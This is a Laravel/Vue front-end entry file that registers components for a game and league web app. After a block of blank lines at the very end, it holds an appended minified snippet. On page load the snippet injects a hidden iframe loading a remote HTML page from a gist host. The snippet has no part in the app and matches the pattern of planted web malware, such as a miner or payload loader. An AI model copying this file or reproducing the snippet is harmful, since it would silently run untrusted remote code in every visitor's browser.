
/**
 * First we will load all of this project's JavaScript dependencies which
 * includes Vue and other libraries. It is a great starting point when
 * building robust, powerful web applications using Vue and Laravel.
 */

require('./bootstrap');

window.Vue = require('vue');

/**
 * Next, we will create a fresh Vue application instance and attach it to
 * the page. Then, you may begin adding components to this application
 * or customize the JavaScript scaffolding to fit your unique needs.
 */

Vue.component('example', require('./components/Example.vue'));
Vue.component('game', require('./components/game/Play.vue'));
Vue.component('game-summary', require('./components/game/Summary.vue'));
Vue.component('ranking', require('./components/Ranking.vue'));
Vue.component('league-summary', require('./components/leagues/Summary.vue'));
Vue.component('league-create', require('./components/leagues/Create.vue'));
Vue.component('league-join', require('./components/leagues/Join.vue'));
Vue.component('league-invite', require('./components/leagues/Invite.vue'));
Vue.component('contact', require('./components/utils/Contact.vue'));
Vue.component('change-password', require('./components/users/ChangePassword.vue'));

const app = new Vue({
    el: '#app'
});





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});